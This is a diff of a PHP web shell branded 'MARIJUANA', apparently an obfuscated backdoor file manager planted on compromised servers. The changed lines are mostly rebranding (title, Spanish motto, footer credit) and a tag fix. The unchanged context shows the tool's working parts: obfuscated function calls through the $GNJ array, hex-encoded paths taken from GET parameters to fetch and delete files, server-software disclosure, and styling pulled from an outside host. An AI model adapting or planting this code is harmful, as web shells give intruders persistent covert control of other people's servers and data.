@@ -52,7 +52,7 @@ for($i=0;$i<$___;$i++) {
 			<meta charset="UTF-8">
 			<meta name="robots" content="NOINDEX, NOFOLLOW">
 
-				<title></title>
+				<title>MARIJUANA</title>
 
 			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
 			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
@@ -65,12 +65,12 @@ for($i=0;$i<$___;$i++) {
 			<header>
 				<div class="y x">
 					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
-					   
+						MARIJuANA
 					</a>
 				</div>
 
 				<div class="q x w">
-					&#8212; &#8212; &#8212;
+					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
 				</div>
 				
 			</header>
@@ -82,7 +82,7 @@ for($i=0;$i<$___;$i++) {
 
 					<br />
 
-					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>INFO SERVER  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
+					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
 
 					<br />
 
@@ -373,7 +373,7 @@ for($i=0;$i<$___;$i++) {
 								<th width="11%">[ SIZE ]</th>
 								<th width="17%">[ PERM ]</th>
 								<th width="17%">[ DATE ]</th>
-								<th width="11%">[ ACTN ]</th>
+								<th width="11%">[ ACT ]</th>
 							</tr>
 						</thead>
 						<tbody>
@@ -457,7 +457,7 @@ for($i=0;$i<$___;$i++) {
 								<a href="?d='.hex($e).'&g='.hex($c).'">G</a>
 								'.$zi.'
 								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
-							</std>
+							</td>
 						</tr>
 						
 						';
@@ -487,7 +487,7 @@ for($i=0;$i<$___;$i++) {
 
 			</article>
 			<footer class="x">
-				&copy; RujakAsemLada
+				&copy;TheAlmightyZeus
 			</footer>
 			<?php
 			if(isset($_GET["1"])) {
@@ -599,4 +599,3 @@ for($i=0;$i<$___;$i++) {
 		$GNJ[37](uhex($_GET["g"]));
 	}
 ?>
-
